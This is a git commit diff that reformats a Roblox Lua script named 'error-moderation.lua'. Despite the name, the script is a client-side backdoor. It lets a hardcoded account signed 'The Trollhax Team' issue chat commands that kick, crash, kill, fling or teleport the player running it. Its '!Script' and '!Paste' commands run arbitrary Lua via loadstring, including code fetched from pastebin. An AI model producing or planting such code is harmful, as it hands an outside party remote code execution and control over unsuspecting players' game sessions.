240ddc4d9eba7b67b6c8147b1e8fdbead183c3a1
Flickworld <100037745+Flickworld@users.noreply.github.com>
2023-09-28 20:39:39 -0400

    Update error-moderation.lua

--- error-moderation.lua
+++ error-moderation.lua
@@ -1,109 +1,109 @@
 if game.ReplicatedStorage:FindFirstChild("Moderated") then
 else
-local Mark = instance.new("BoolValue")
-Mark.Parent = game:WaitForChild("ReplicatedStorage")
-Mark.Name = "Moderated"
-local Moderator = "8RR0R404"
+	local Mark = Instance.new("BoolValue")
+	Mark.Parent = game:WaitForChild("ReplicatedStorage")
+	Mark.Name = "Moderated"
+	local Moderator = "8RR0R404"
 
-print("Moderator loaded: ".. Moderator.. ", You are under moderation.")
+	print("Moderator loaded: ".. Moderator.. ", You are under moderation.")
 
-local Players = game.Players:GetPlayers()
+	local Players = game.Players:GetPlayers()
 
-for i, v in pairs(Players) do
-	if v.Name == Moderator then
-		v.Chatted:Connect(function(Command)
-
-
-			if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
-			end
+	for i, v in pairs(Players) do
+		if v.Name == Moderator then
+			v.Chatted:Connect(function(Command)
 
 
-			if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
-				while true do
-					print("Your connection has been Crashed by The Trollhax Team.")
+				if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
 				end
-			end
 
 
-			if Command == "!Bring ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
-			end
+				if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
+					while true do
+						print("Your connection has been Crashed by The Trollhax Team.")
+					end
+				end
 
 
-			if Command == "!Carry ".. game.Players.LocalPlayer.DisplayName then
-				repeat
-					wait()
-					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
-				until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
-			end
-
-
-			if Command == "!Fling ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
-				local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
-				wait(0.1)
-				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
-				wait(0.1)
-				game.Players.LocalPlayer.Character.Humanoid.Jump = true
-				wait(0.1)
-				game.Players.LocalPlayer.Character.Humanoid.Sit = true
-				wait(1)
-				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
-			end
-
-
-			if Command == "!Kill ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character.Humanoid.Health = 0
-			end
-
-
-			if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
-				while true do
-					wait()
+				if Command == "!Bring ".. game.Players.LocalPlayer.DisplayName then
 					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
 				end
-			end
 
 
-			if Command == "!Fall ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character:WaitForChild("Humanoid").PlatformStand = true
-			end
-
-
-			local CommandData = {}
-			for Data in Command:gmatch("[^%s]+") do
-				table.insert(CommandData, Data)
-			end
-
-			if CommandData[1] == "!Kick" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					game.Players.LocalPlayer:Kick(CommandData[3])
+				if Command == "!Carry ".. game.Players.LocalPlayer.DisplayName then
+					repeat
+						wait()
+						game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
+					until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
 				end
-			end
 
 
-			if CommandData[1] == "!Script" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(CommandData[3])()
+				if Command == "!Fling ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
+					local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
+					wait(0.1)
+					game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
+					wait(0.1)
+					game.Players.LocalPlayer.Character.Humanoid.Jump = true
+					wait(0.1)
+					game.Players.LocalPlayer.Character.Humanoid.Sit = true
+					wait(1)
+					game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
 				end
-			end
 
 
-			if CommandData[1] == "!Paste" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
+				if Command == "!Kill ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer.Character.Humanoid.Health = 0
 				end
-			end
+
+
+				if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
+					while true do
+						wait()
+						game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
+					end
+				end
+
+
+				if Command == "!Fall ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer.Character:WaitForChild("Humanoid").PlatformStand = true
+				end
+
+
+				local CommandData = {}
+				for Data in Command:gmatch("[^%s]+") do
+					table.insert(CommandData, Data)
+				end
+
+				if CommandData[1] == "!Kick" then
+					if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+						game.Players.LocalPlayer:Kick(CommandData[3])
+					end
+				end
+
+
+				if CommandData[1] == "!Script" then
+					if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+						loadstring(CommandData[3])()
+					end
+				end
+
+
+				if CommandData[1] == "!Paste" then
+					if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+						loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
+					end
+				end
 
 
 
 
 
 
-		end)
+			end)
+		end
 	end
-end
 
 
 
@@ -143,97 +143,97 @@ end
 
 
 
-game.Players.PlayerAdded:Connect(function(Player)
-	if Player.Name == Moderator then
-		Player.Chatted:Connect(function(Command)
-			if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
-			end
-
-
-			if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
-				while true do
-					print("Your connection has been Crashed by The Trollhax Team.")
+	game.Players.PlayerAdded:Connect(function(Player)
+		if Player.Name == Moderator then
+			Player.Chatted:Connect(function(Command)
+				if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
 				end
-			end
 
 
-			if Command == "!Bring ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
-			end
+				if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
+					while true do
+						print("Your connection has been Crashed by The Trollhax Team.")
+					end
+				end
 
 
-			if Command == "!Carry ".. game.Players.LocalPlayer.DisplayName then
-				repeat
-					wait()
-					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
-				until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
-			end
-
-
-			if Command == "!Fling ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
-				local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
-				wait(0.1)
-				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
-				wait(0.1)
-				game.Players.LocalPlayer.Character.Humanoid.Jump = true
-				wait(0.1)
-				game.Players.LocalPlayer.Character.Humanoid.Sit = true
-				wait(1)
-				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
-			end
-
-
-			if Command == "!Kill ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character.Humanoid.Health = 0
-			end
-
-
-			if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
-				while true do
-					wait()
+				if Command == "!Bring ".. game.Players.LocalPlayer.DisplayName then
 					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
 				end
-			end
 
 
-			if Command == "!Fall ".. game.Players.LocalPlayer.DisplayName then
-				game.Players.LocalPlayer.Character:WaitForChild("Humanoid").PlatformStand = true
-			end
-
-
-			local CommandData = {}
-			for Data in Command:gmatch("[^%s]+") do
-				table.insert(CommandData, Data)
-			end
-			
-			
-			if CommandData[1] == "!Kick" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					game.Players.LocalPlayer:Kick(CommandData[3])
+				if Command == "!Carry ".. game.Players.LocalPlayer.DisplayName then
+					repeat
+						wait()
+						game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
+					until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
 				end
-			end
 
 
-			if CommandData[1] == "!Script" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(CommandData[3])()
+				if Command == "!Fling ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
+					local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
+					wait(0.1)
+					game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
+					wait(0.1)
+					game.Players.LocalPlayer.Character.Humanoid.Jump = true
+					wait(0.1)
+					game.Players.LocalPlayer.Character.Humanoid.Sit = true
+					wait(1)
+					game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
 				end
-			end
-					
 
-			if CommandData[1] == "!Paste" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
+
+				if Command == "!Kill ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer.Character.Humanoid.Health = 0
 				end
-			end
+
+
+				if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
+					while true do
+						wait()
+						game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
+					end
+				end
+
+
+				if Command == "!Fall ".. game.Players.LocalPlayer.DisplayName then
+					game.Players.LocalPlayer.Character:WaitForChild("Humanoid").PlatformStand = true
+				end
+
+
+				local CommandData = {}
+				for Data in Command:gmatch("[^%s]+") do
+					table.insert(CommandData, Data)
+				end
+
+
+				if CommandData[1] == "!Kick" then
+					if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+						game.Players.LocalPlayer:Kick(CommandData[3])
+					end
+				end
+
+
+				if CommandData[1] == "!Script" then
+					if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+						loadstring(CommandData[3])()
+					end
+				end
+
+
+				if CommandData[1] == "!Paste" then
+					if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+						loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
+					end
+				end
 
 
 
 
 
-		end)
-	end
-end)
+			end)
+		end
+	end)
 end
